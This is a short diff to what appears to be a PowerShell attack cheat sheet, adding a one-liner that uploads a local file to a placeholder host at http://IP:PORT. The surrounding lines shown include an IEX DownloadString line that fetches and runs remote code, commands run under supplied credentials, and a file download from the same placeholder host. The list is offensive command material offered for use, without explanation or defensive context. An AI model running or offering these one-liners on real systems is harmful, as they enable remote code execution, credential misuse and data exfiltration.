@@ -12,3 +12,4 @@ IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILE')
 Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost
 Start-Process -FilePath "powershell" -ArgumentList COMMAND -Credential $cred
 (New-Object Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'FILE')
+(New-Object Net.WebClient).UploadFile('http://IP:PORT/FILE', 'FILE')
